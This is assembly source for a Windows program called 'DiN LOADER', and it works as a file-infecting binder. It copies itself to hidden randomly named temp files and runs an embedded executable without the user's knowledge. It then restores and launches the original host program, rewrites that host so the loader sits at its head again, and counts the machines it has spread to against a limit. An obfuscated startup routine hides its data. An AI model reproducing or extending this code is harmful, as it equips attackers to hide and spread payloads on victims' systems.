; ====================================================================
;			DiN LOADER
; ====================================================================

.486
.model flat, stdcall
option casemap:none

	include		windows.inc
	include		kernel32.inc
	include		user32.inc
	includelib	kernel32.lib
	includelib	user32.lib
	include		PE_Data.inc

	FILENAME_MAXLENGTH	EQU	1024*16
	LOADER_DEBUG	= 0


IF LOADER_DEBUG
	Mess	PROTO	pMes:DWORD
ENDIF

messa MACRO	MESSAGE:REQ
local moff
	call	moff
	db	"&MESSAGE&"
	db	0
	moff:	call	Mess
ENDM

; ====================================================================

LOADERDATA	STRUCT
	loader_size		dd	?
	origin_size		dd	?
	machine_id		dd	?
	machines_counter	dw	?
	machines_counter_limit	dw	?
LOADERDATA	ENDS

; ====================================================================

ioOpen		PROTO	pPath	  :DWORD,	;  ZF  EAX - handle
			Access	  :DWORD,	;
			Creation  :DWORD,
			Attrib	  :DWORD,
			ShareMode :DWORD

ioOpenTemp	PROTO	pNBuf	:DWORD		;  ZF  EAX - handle

ioSize		PROTO	hFile	:DWORD		;  ZF  EAX - FileSize

ioRead 		PROTO	hFile   :DWORD,		;  ZF
			pBuf	:DWORD,
			FilePos	:DWORD,
			nBytes	:DWORD

ioWrite 	PROTO	hFile	:DWORD,		;  ZF
			pBuf	:DWORD,
			FilePos :DWORD,
			nBytes	:DWORD

ioTrunc		PROTO	hFile	 :DWORD,	;  ZF
			Position :DWORD

ioClose		PROTO	hFile	:DWORD		; 

ioAttribResetRO	PROTO	pPath	:DWORD		;  ZF  EAX - old attributes

ioAttribSet	PROTO	pPath	:DWORD,		;  ZF
			nAttr	:DWORD

gMemGet		PROTO	nSize	:DWORD		;  ZF  EAX - MemSize

gMemFree	PROTO	pMemo	:DWORD		; 

gCreateProcess	PROTO	pPath	:DWORD,		;  ZF  EAX - handle
			pParam	:DWORD

gCreateMutex	PROTO	pSeca	 :DWORD,	;  ZF  EAX - handle
			bInitOwn :DWORD,
			pName	 :DWORD

gWaitObject	PROTO	handl	:DWORD		; 
gDeleteFile	PROTO	pPath	:DWORD		;  ZF
gMachineID	PROTO				;  EAX	- machine ID

gGetArgs	PROTO				;  EAX	- pArgs
gGetCmdLine	PROTO				;  EAX	- pCommandLine
gGetCmdLineCopy	PROTO				;  ZF  EAX - pCommandLine
gGetMyName 	PROTO				;  ZF  EAX - pName

gAsciizLength	PROTO	pStr 	:DWORD		;  EAX - Length
gAsciizSplit	PROTO	pStr1	:DWORD,		;  ZF  EAX - pNewAsciiz
			pStr2	:DWORD
gAsciizQuote	PROTO	pStr1	:DWORD		;  ZF  EAX - pNewAsciiz
gIntToHex	PROTO	nVal 	:DWORD,		; 
			pStrh	:DWORD

loader_calc_ofs	PROTO	pLoaderData :DWORD	;  EAX - patch_offset;  EBX - patch_size
loader_entry_1	PROTO	pLoaderData :DWORD
loader_entry_2	PROTO	pLoaderData :DWORD



; --------------------------------------------------------------------
IF LOADER_DEBUG
	.data
		dm_id_mess	db	"Machine_ID:"
		dm_id_machine	db	"XXXXXXXXh Last_ID:"
		dm_id_stored	db	"XXXXXXXXh",0
ENDIF
; ====================================================================

.code

start:
		mov	EAX, DWORD PTR [fake_data_two]
		mov	ECX, EAX
		mov	AL, 40h
fakestartcalc:	push	AX
		loop	fakestartcalc	; Really push 400040h	[LOADERDATA]
entry_call:	call	loader_entry_1

		push	0
exit_process:	call	ExitProcess

	entryXcall_ptr		EQU	offset entry_call - offset start +1
	entry1call_offset	EQU	offset loader_entry_1 - offset entry_call -5
	entry2call_offset	EQU	offset loader_entry_2 - offset entry_call -5

dinloader_extra_module:
	include	dinloader.inc
dinloader_extra_module_end:
	dinloader_extra_module_size EQU injected_exe_size

exit_er:	call	exit_process	; 40100XXh error retcode :)

; ====================================================================
; ========================                   =========================
; ========================  ENTRY POINT # 1  =========================
; ========================                   =========================
; ====================================================================


loader_entry_1	proc	pLoaderData:DWORD

	; <<----------------------------------------------------------
        ; INIT

        mov	ESI, pLoaderData
	mov	ECX, DWORD PTR [ESI]
	invoke	gMemGet, ECX	;!!	ECX = Loader size
	jz	exit_er
	mov	EDI, EAX	;!!	EDI = I/O Buffer
	invoke	gGetMyName
	jz	exit_er
	mov	ESI, EAX	;!!	ESI = This module file name

	; <<----------------------------------------------------------
	; Read & prepare loader from self

	invoke	ioOpen, ESI, GENERIC_READ, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0
	jz	exit_er
	invoke	ioRead, EAX, EDI, 0, ECX
	jz	exit_er
	invoke	ioClose, EAX

	mov	EAX, DWORD PTR [EDI + 80h + size(HDR_PE) + SECTION_DESCRIPTOR.PointerToRawData]
	mov	DWORD PTR [EDI + EAX + entryXcall_ptr], entry2call_offset

	; <<----------------------------------------------------------
	; Write loader

	invoke	gMemGet,  FILENAME_MAXLENGTH
	jz	exit_er
	mov	EDX, EAX	;!!	EDX = Loader{2} file name
	invoke	ioOpenTemp, EDX
	jz	exit_er
	invoke	ioWrite, EAX, EDI, 0, ECX
	jz	exit_er
	invoke	ioClose, EAX
	invoke	gMemFree, EDI

	; <<----------------------------------------------------------
	; Launch loader

	invoke	gAsciizLength, EDX
	sub	EAX, 9
	add	EAX, EDX			; Unical mutex name = temp file name
	push	TRUE				; SECURITY_ATTRIBUTES.bInheritHandle
	push	0				; SECURITY_ATTRIBUTES.lpSecurityDescriptor
	push	12				; SECURITY_ATTRIBUTES.nLength
	mov	EBX, ESP
	invoke	gCreateMutex, EBX, TRUE, EAX
	add	ESP, 12
	invoke	gGetArgs
	mov	ECX, EAX	;!!ECX!=
	invoke	gAsciizQuote, ESI
	jz	exit_er
	invoke	gAsciizSplit, EAX, ECX
	jz	exit_er

	invoke	gCreateProcess, EDX, EAX
	ret
loader_entry_1	endp

; ====================================================================
; ========================                   =========================
; ========================  ENTRY POINT # 2  =========================
; ========================                   =========================
; ====================================================================

loader_entry_2	proc	pLoaderData:DWORD
	LOCAL	nPatchSize:DWORD
	LOCAL	nPatchOffs:DWORD;
	LOCAL	pLoaderFileName:DWORD
	LOCAL	pOriginFileName:DWORD
	LOCAL	pOriginReadOnly:BYTE
	LOCAL	pOriginAttribut:DWORD
	LOCAL	loaderdata:LOADERDATA

	; <<----------------------------------------------------------
	; Write and launch embedded file

	invoke	gMemGet,  FILENAME_MAXLENGTH
	jz	exit_er
	mov	ESI, EAX
	invoke	ioOpenTemp, ESI
	jz	$nonjex
	invoke	ioWrite, EAX, offset dinloader_extra_module, 0, dinloader_extra_module_size	;!! PLACE IT HERE :)
	invoke	ioClose, EAX
	jz	$nonjex			; ZF from ioWrite,  not ioClose
	invoke	gCreateProcess, ESI, 0
	jz	$injdel
	IF LOADER_DEBUG
		invoke	gWaitObject, EAX
	ENDIF
$injdel:invoke	gDeleteFile, ESI
$nonjex:invoke	gMemFree, ESI

	; <<----------------------------------------------------------
	; Init

	invoke	gGetMyName
	jz	exit_er
	mov	pLoaderFileName, EAX

	invoke	gGetCmdLineCopy
	jz	exit_er
	mov	EDI, EAX
	invoke	gAsciizLength, EAX
	mov	ECX, EAX
	mov	AL, '"'
	scasb
	jnz	exit_er		; cmd line generated not by loader ?
	mov	pOriginFileName, EDI
	dec	ECX
	repnz	scasb
	jnz	exit_er		; --||--

	xor	EAX, EAX
	dec	EDI
	stosb			; Only FileName

	lea	EDI, loaderdata
	push	EDI		; 
	mov	ESI, pLoaderData
	mov	ECX, SIZEOF(LOADERDATA)
	rep	movsb

	call	loader_calc_ofs	; 
	mov	nPatchOffs, EAX
	mov	nPatchSize, EBX

	invoke	gMemGet, loaderdata.loader_size
	jz	exit_er
	mov	EDI, EAX

	; <<----------------------------------------------------------
	; Wait parent loader execution by named mutex

	mov	EBX, pLoaderFileName
	invoke	gAsciizLength, EBX
	add	EAX, EBX
	sub	EAX, 9
	invoke	gCreateMutex, 0, 0, EAX
	invoke	gWaitObject, EAX

	; <<----------------------------------------------------------
	; Restore initial parent image

	mov	pOriginReadOnly, 0
	invoke	ioAttribResetRO, pOriginFileName
	mov	pOriginAttribut, EAX

	invoke	ioOpen, pOriginFileName, GENERIC_READ OR GENERIC_WRITE, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0
	mov	EBX, EAX
	jz	$rp_ro

	invoke	ioRead,  EBX, EDI, nPatchOffs, nPatchSize
	jz	exit_er
	invoke	ioWrite, EBX, EDI, 0, nPatchSize
	jz	exit_er
	invoke	ioTrunc, EBX, loaderdata.origin_size
	invoke	ioClose, EBX
	invoke	ioAttribSet, pOriginFileName, pOriginAttribut

	jmp	$launc1

	; ReadOnly restore
$rp_ro:
	mov	pOriginReadOnly, 1
	invoke	ioOpen, pOriginFileName, GENERIC_READ, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0
	jz	exit_er
	mov	EBX, EAX
	invoke	ioOpenTemp, pOriginFileName	;!! Remake to %TEMP%\OriginFileName?
	jz	exit_er

	invoke	ioRead,  EBX, EDI, nPatchOffs, nPatchSize
	jz	exit_er
	invoke	ioWrite, EAX, EDI, 0, nPatchSize
	jz	exit_er

	mov	ECX, loaderdata.origin_size
	mov	ESI, loaderdata.loader_size	;!! FPOS if needed

$roloop:mov	EDX, loaderdata.loader_size	; Buffer Read/Write loop
	test	ECX, ECX
	jz	$rofail	; actually not fail
	cmp	ECX, EDX
	jge	$nrf1
	mov	EDX, ECX
$nrf1:
	invoke	ioRead,  EBX, EDI, ESI, EDX
	jz	$rofail
	invoke	ioWrite, EAX, EDI, ESI, EDX
	jz	$rofail
	sub	ECX, EDX
	add	ESI, ECX
	jmp	$roloop

$rofail:invoke	ioClose, EAX
	invoke	ioClose, EBX

	; <<----------------------------------------------------------
	; Launch initial parent

$launc1:
	invoke	gGetCmdLine
	invoke	gCreateProcess, pOriginFileName, EAX
	jz	$now35
	invoke	gWaitObject, EAX
$now35:


	; <<----------------------------------------------------------
	; Restore loader ?

	cmp	pOriginReadOnly, 1
	jz	$NoRestore

	invoke	gMachineID
	mov	EBX, loaderdata.machine_id
	mov	loaderdata.machine_id, EAX

	IF LOADER_DEBUG
		invoke	gIntToHex, EAX, offset dm_id_machine
		invoke	gIntToHex, EBX, offset dm_id_stored
		invoke	Mess, offset dm_id_mess
	ENDIF

	test	EBX, EBX	; 1-st launch ?
	jz	$Restore
	cmp	EAX, EBX	; still here ?
	jz	$Restore
	inc	loaderdata.machines_counter

$Restore:
	mov	AX, loaderdata.machines_counter_limit
	test	AX, AX
	jz	$NoCounter
	cmp	loaderdata.machines_counter, AX
	jae	$NoRestore

$NoCounter:
	mov	ECX, 0FFFh
	invoke	ioAttribResetRO, pOriginFileName
	mov	pOriginAttribut, EAX

$insist:invoke	ioOpen, pOriginFileName, GENERIC_READ OR GENERIC_WRITE, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0
	loopz	$insist
	jz	$ilfex
	mov	EBX, EAX

	invoke	ioSize, EBX
	jz	$ilfail
	mov	loaderdata.origin_size, EAX

	push	EBX
	lea	EAX, loaderdata			; + self size (in case of virus changing?)
	invoke	loader_calc_ofs, EAX
	mov	nPatchOffs, EAX
	mov	nPatchSize, EBX
	pop	EBX

	invoke	ioRead,  EBX, EDI, 000,        nPatchSize
	jz	$ilfail
	invoke	ioWrite, EBX, EDI, nPatchOffs, nPatchSize
	jz	$ilfail
	invoke	ioOpen,  pLoaderFileName, GENERIC_READ, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0
	jz	exit_er
	invoke	ioRead,  EAX, EDI, 000, loaderdata.loader_size
	jz	exit_er
	invoke	ioClose, EAX

	mov	EAX, DWORD PTR [EDI + 80h + size(HDR_PE) + SECTION_DESCRIPTOR.PointerToRawData]
	mov	DWORD PTR [EDI+EAX + entryXcall_ptr], entry1call_offset

	pusha
	add	EDI, 40h	; LOADERDATA_OFFSET
	lea	ESI, loaderdata
	mov	ECX, SIZEOF(LOADERDATA)
	rep	movsb
	popa

	invoke	ioWrite, EBX, EDI, 000, loaderdata.loader_size
$ilfail:invoke	ioClose, EBX
	invoke	ioAttribSet, pOriginFileName, pOriginAttribut
$ilfex:

$NoRestore:
	invoke	gDeleteFile, pLoaderFileName

	ret

loader_entry_2	endp







; ====================================================================
; ============================        ================================
; ============================  SUBS  ================================
; ============================        ================================
; ====================================================================


; --------------------------------------------------------------------
; 	ZF 	- success

ioWrite proc 	hFile:DWORD, pBuf:DWORD, FilePos:DWORD, nBytes:DWORD
	pushad
	mov	ECX, SIZEOF (OVERLAPPED)
	sub	ESP, ECX
	mov	EDI, ESP
	mov	ESI, EDI
	xor	EAX, EAX
	rep	stosb
	mov	EAX, FilePos
	mov	DWORD PTR [ESI + OVERLAPPED.loffset], EAX
	invoke	WriteFile, hFile, pBuf, nBytes, 0, ESI
	add	ESP, SIZEOF (OVERLAPPED)
	test	EAX, EAX
	popad
	ret
ioWrite endp

; --------------------------------------------------------------------
; 	ZF 	- success

ioRead proc	hFile:DWORD, pBuf:DWORD, FilePos:DWORD, nBytes:DWORD
	pushad
	mov	ECX, SIZEOF (OVERLAPPED)
	sub	ESP, ECX
	mov	EDI, ESP
	mov	ESI, EDI
	xor	EAX, EAX
	rep	stosb
	mov	EAX, FilePos
	mov	DWORD PTR [ESI + OVERLAPPED.loffset], EAX
	invoke	ReadFile, hFile, pBuf, nBytes, 0, ESI
	add	ESP, SIZEOF (OVERLAPPED)
	test	EAX, EAX
	popad
	ret
ioRead endp

; --------------------------------------------------------------------

ioClose proc	hFile:DWORD
	pushad
	pushf
	invoke	CloseHandle, hFile
	popf
	popad
	ret
ioClose endp

; --------------------------------------------------------------------
; 	ZF 	- success
; 	EAX	- FileSize

ioSize proc hFile:DWORD
	pushad
	invoke	GetFileSize, hFile, 0
	mov	hFile, EAX
	cmp	EAX, 0FFFFFFFFh
	popad
	mov	EAX, hFile
	ret
ioSize endp


; --------------------------------------------------------------------
; 	ZF 	- success
; 	EAX	- handle

ioOpen proc	pPath:DWORD, Access:DWORD, Creation:DWORD, Attrib:DWORD, ShareMode:DWORD
	pushad
	invoke	CreateFileA, pPath, Access, ShareMode, 0, Creation, Attrib, 0
	cmp	eax, INVALID_HANDLE_VALUE
	mov	pPath, eax
	popad
	mov	eax, pPath
	ret
ioOpen endp

; --------------------------------------------------------------------
; 	ZF 	- success

ioTrunc		proc	hFile:DWORD, Position:DWORD
	pushad
	invoke	SetFilePointer, hFile, Position, 0, FILE_BEGIN
	cmp	eax, 0FFFFFFFFh
	jz	$iocen
	invoke	SetEndOfFile, hFile
	test	eax, eax
$iocen:	popad
	ret
ioTrunc		endp


; --------------------------------------------------------------------
;  	ZF 	- success
; 	EAX	- MemSize

gMemGet	proc	nSize:DWORD
	pushad
	invoke	GetProcessHeap
	test	eax, eax
	jz	$hpfail
	invoke	HeapAlloc, eax, HEAP_NO_SERIALIZE, nSize
	test	eax, eax
$hpfail:mov	nSize, eax
	popad
	mov	eax, nSize
	ret
gMemGet	endp

; --------------------------------------------------------------------

gMemFree	proc	pMem:DWORD
	pushad
	pushf
	invoke	GetProcessHeap
	invoke	HeapFree, eax, HEAP_NO_SERIALIZE, pMem
	popf
	popad
	ret
gMemFree	endp


; --------------------------------------------------------------------
; 	EAX	- length (with 0)

gAsciizLength	proc pString:DWORD
	push	EDI
	push	ECX
	mov	EDI, pString
	xor	EAX, EAX
	xor	ECX, ECX
$gsl$:	inc	ECX
	scasb
	jnz	$gsl$
	mov	EAX, ECX
	pop	ECX
	pop	EDI
	ret
gAsciizLength	endp

; --------------------------------------------------------------------
;  	EAX	- pNewAsciiz
;  	ZF	- success

gAsciizSplit	proc	pStr1:DWORD, pStr2:DWORD
	pushad
	invoke	gAsciizLength, pStr1
	mov	EBX, EAX
	invoke	gAsciizLength, pStr2
	mov	EDX, EAX
	add	EAX, EBX
	dec	EAX
	invoke	gMemGet, EAX
	jz	$noaspl
	pushf
	mov	EDI, EAX
	mov	ESI, pStr1
	mov	pStr1, EAX
	mov	ECX, EBX
	dec	ECX
	rep	movsb
	mov	ECX, EDX
	mov	ESI, pStr2
	rep	movsb
	popf
$noaspl:popad
	mov	EAX, pStr1
	ret
gAsciizSplit	endp

; --------------------------------------------------------------------
;  	EAX	- pNewAsciiz
;  	ZF	- success

gAsciizQuote	proc	pStr1:DWORD
	pushad
	invoke	gAsciizLength, pStr1
	mov	ECX, EAX
	add	EAX, 2
	invoke	gMemGet, EAX
	jz	$noasqu
	mov	EDI, EAX
	mov	ESI, pStr1
	push	ESI		; 
	mov	pStr1, EDI
	dec	ECX
	mov	AX, 022h
	stosb
	rep	movsb
	stosw
	call	gMemFree	; 
$noasqu:popad
	mov	EAX, pStr1
	ret
gAsciizQuote	endp

; --------------------------------------------------------------------
; 	EAX	- pName
; 	ZF	- sucess

gGetMyName proc
LOCAL	pMyName:DWORD
	pushad
	mov	ECX, FILENAME_MAXLENGTH
	invoke	gMemGet, ECX
	jz	$gmnex
	push	EAX
	dec	ECX
	invoke	GetModuleFileNameA, 0, EAX, ECX
	mov	EDI, [ESP]
	pop	pMyName
	test	EAX, EAX
	jz	$gmnex
	mov	BYTE PTR [EDI+EAX], 0
$gmnex:	popad
	mov	EAX, pMyName
	ret
gGetMyName endp

; --------------------------------------------------------------------
; 	ZF	- sucess
;	EAX	- hfile

ioOpenTemp proc pNameBuf:DWORD
	pushad
	push	0
	push	"PMET"
	mov	EAX, ESP	; 	T,E,M,P,0
	invoke	GetEnvironmentVariableA, EAX, pNameBuf, FILENAME_MAXLENGTH - 10
	mov	EDI, pNameBuf	; if GetEnvVar failed then we
	add	EDI, EAX        ; write to root directory (/********)
	mov	AL, '\'
	stosb
	mov	ECX, 8
	sub	ESP, ECX
	mov	ESI, ESP
$otfl$:
	dw	0310Fh		; RDTSC
	add	EAX, EDX
	bswap	EDX
	add	[ESI+1], EDX
	imul	EAX, [ESI]
	add	EAX, [ESI+2]
	xor	[ESI], EAX
	add	EAX, [ESI+3]
	xor	EAX, EDX
	xor	EDX, EDX
	mov	EBX, 26
	add	[ESI+3], EAX
	div	EBX
	xchg	EAX, EDX
	add	AL, 'a'
	stosb
	loop	$otfl$
	xor	EAX, EAX
	stosb
	add	ESP, 16
	popad
	invoke	ioOpen, pNameBuf, GENERIC_READ OR GENERIC_WRITE, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0
	ret
ioOpenTemp endp


; --------------------------------------------------------------------
; 	EAX	- pArgs

gGetArgs proc
LOCAL	retcod:DWORD
	pushad
	pushf
	invoke	gGetCmdLine
	mov	ESI, EAX
	mov	AH, ' '
	lodsb
	cmp	AL, '"'
	jnz	$gal1
	mov	AH, '"'
$gal1:	lodsb
	test	AL, AL
	jz	$galex
	cmp	AL, AH
	jnz	$gal1
	inc	ESI
$galex:	dec	ESI
	mov	retcod, ESI
	popf
	popad
	mov	EAX, retcod
	ret
gGetArgs endp

; --------------------------------------------------------------------
; 	EAX	- pCommandLine

gGetCmdLine	proc
LOCAL	retcod:DWORD
	pushad
	pushf
	invoke	GetCommandLine
	mov	retcod, EAX
	popf
	popad
	mov	EAX, retcod
	ret
gGetCmdLine	endp

; --------------------------------------------------------------------
; 	EAX	- pCommandLine
; 	ZF 	- success

gGetCmdLineCopy	proc
LOCAL	retcod:DWORD
	pusha
	invoke	gGetCmdLine
	push	EAX
	mov	ESI, DWORD PTR [ESP]
	call	gAsciizLength
	push	EAX
	mov	ECX, DWORD PTR [ESP]
	call	gMemGet
	jz	$gclcer
	mov	retcod, EAX
	mov	EDI, EAX
	rep	movsb
	test	ESP, ESP	; = clear ZF
$gclcer:popa
	mov	EAX, retcod
	ret
gGetCmdLineCopy	endp

; --------------------------------------------------------------------
; 	EAX	- Machine ID

gMachineID	proc
LOCAL	shft:DWORD
	pushad
	sub	ESP, 64		; MAX Windir length
	mov	ESI, ESP	; windir path buffer
	push	007269h		; windir
	push	"dniw"		; windir

	mov	EAX, ESP
	push	ESI
	invoke	GetEnvironmentVariableA, EAX, ESI, FILENAME_MAXLENGTH
	mov	ESI, DWORD PTR [ESP]
	invoke	CreateFile, ESI, 0, 0, 0, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, 0

	mov	ESI, DWORD PTR [ESP]

	push	EAX	; 
	xor	EAX, EAX
	mov	EDI, ESI
	add	EDI, 3
	stosb
	mov	EBX, EDI	; +4
	stosd
	mov	EDX, EDI	; +8
	stosd			; +12

	invoke	GetVolumeInformation, ESI, 0, 0, EBX, EDX, EDI, 0, 0
	pop	EBX	; 

	mov	ESI, DWORD PTR [ESP]
	add	ESI, 16
	invoke	GetFileTime, EBX, ESI, 0, 0

	pop	ESI
	mov	ECX, 6
	mov	EDX, 'M4Ch'

$grvsl$:lodsd
	xor	EDX, EAX
	loop	$grvsl$

	mov	shft, EAX
	add	ESP, 72
	popad
	mov	EAX, shft
	ret
gMachineID	endp

; --------------------------------------------------------------------
; 	EAX	- process handle
; 	ZF 	- success

gCreateProcess	proc	pPath:DWORD, pParam:DWORD
	pusha
	mov	ECX, SIZEOF (STARTUPINFO)
	sub	ESP, SIZEOF (STARTUPINFO) + SIZEOF (PROCESS_INFORMATION)
	mov	EDI, ESP
	mov	ESI, EDI
	xor	EAX, EAX
	rep	stosb
	push	EDI
	invoke	CreateProcessA, pPath, pParam, 0, 0, 0, 0, 0, 0, ESI, EDI
	pop	EDI
	add	ESP, SIZEOF (STARTUPINFO) + SIZEOF (PROCESS_INFORMATION)
	mov	EBX, [EDI]	; hprocess
	mov	pPath, EBX
	test	EAX, EAX
	popa
	mov	EAX, pPath
	ret
gCreateProcess	endp

; --------------------------------------------------------------------

gWaitObject	proc	handl:DWORD
	pusha
	pushf
	invoke	WaitForSingleObject, handl, INFINITE
	popf
	popa
	ret
gWaitObject	endp

; --------------------------------------------------------------------
; 	EAX	- handle
; 	ZF 	- success
gCreateMutex	proc	pSeca:DWORD, bInitialOwner:DWORD, pName:DWORD
	pusha
	invoke	CreateMutexA, pSeca, bInitialOwner, pName
	mov	pSeca, EAX
	popa
	mov	EAX, pSeca
	test	EAX, EAX
	ret
gCreateMutex	endp

; --------------------------------------------------------------------
; 	ZF 	- success
gDeleteFile	proc	pPath:DWORD
	pusha
	invoke	DeleteFile, pPath
	test	EAX, EAX
	jnz	$gdfok
	invoke	MoveFileEx, pPath, 0, MOVEFILE_DELAY_UNTIL_REBOOT
	test	EAX, EAX
$gdfok:	popa
	ret
gDeleteFile	endp

; --------------------------------------------------------------------
; 	EAX	- old attribute
; 	ZF 	- success

ioAttribResetRO	proc	pPath:DWORD
	pushad
	invoke	GetFileAttributes, pPath
	cmp	EAX, 0FFFFFFFFh
	jz	$iroaex
	push	EAX
	and	EAX, NOT FILE_ATTRIBUTE_READONLY
	invoke	SetFileAttributes, pPath, EAX
	test	EAX, EAX
	pop	pPath
$iroaex:popad
	mov	EAX, pPath
	ret
ioAttribResetRO	endp

; --------------------------------------------------------------------
; 	ZF 	- success

ioAttribSet	proc	pPath:DWORD, nAttr:DWORD
	pushad
	invoke	SetFileAttributes, pPath, nAttr
	test	EAX, EAX
	popad
	ret
ioAttribSet	endp

; --------------------------------------------------------------------
; 	EAX	- patch_offset
; 	EBX	- patch_size

loader_calc_ofs	proc	pLoaderData:DWORD
	pushf
	push	ESI
	mov	ESI, pLoaderData
	mov	EAX, DWORD PTR [ESI+LOADERDATA.loader_size]
	mov	EBX, DWORD PTR [ESI+LOADERDATA.origin_size]
	cmp	EAX, EBX
	jg	$lcosn
	xchg	EAX, EBX
$lcosn:	pop	ESI
	popf
	ret
loader_calc_ofs	endp



; --------------------------------------------------------------------

; --------------------------------------------------------------------
IF LOADER_DEBUG
	; ------------------------------------------------------------
	gIntToHex	proc	nVal:DWORD, pHexStr:DWORD
		pushad
		pushf
		std
		call	$hexlat
		db	"0123456789ABCDEF"
	$hexlat:pop	EBX
		mov	EDI, pHexStr
		mov	ECX, 8
		add	EDI, ECX
		dec	EDI
		mov	EAX, nVal
	$hexlp:	push	EAX
		and	EAX, 0Fh
		xlat
		stosb
		pop	EAX
		shr	EAX, 04h
		loop	$hexlp
		popf
		popad
		ret
	gIntToHex endp
	; ------------------------------------------------------------
	Mess proc pMes:DWORD
		pusha
		pushf
		call	$4444
		db	"MSG !!"
		$4444:
		pop	EAX
		invoke	MessageBoxA, 0, pMes, EAX, MB_OK OR MB_TOPMOST
		popf
		popa
		ret
	Mess endp
ENDIF


fake_data_two	dd	2

end start

; --------------------------------------------------------------------
